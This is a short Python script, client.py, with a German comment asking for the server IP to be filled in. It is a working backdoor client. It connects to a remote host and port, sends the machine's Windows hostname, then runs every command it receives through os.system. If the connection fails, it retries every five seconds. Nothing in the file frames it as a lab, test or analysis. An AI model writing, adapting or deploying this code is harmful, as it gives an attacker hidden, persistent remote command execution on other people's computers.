# client.py
import socket
import time
import os

SERVER_IP = '192.168.1.100'  # <-- Deine Server-IP hier eintragen
SERVER_PORT = 9999

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            hostname = os.getenv('COMPUTERNAME')
            s.sendall(hostname.encode())

            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                if command:
                    os.system(command)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    connect_to_server()
